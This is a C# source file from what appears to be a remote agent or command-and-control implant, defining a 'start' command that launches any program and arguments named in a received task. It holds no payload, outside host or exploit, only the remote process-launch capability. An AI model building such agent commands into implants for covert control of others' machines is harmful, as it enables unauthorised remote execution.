﻿using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class StartCommand : AgentCommand
    {
        public override string Name => "start";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            var filename = task.SplittedArgs[0];
            string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();
            Executor.StartCommand(filename, args);
            result.Result = "Process started";
        }
    }
}
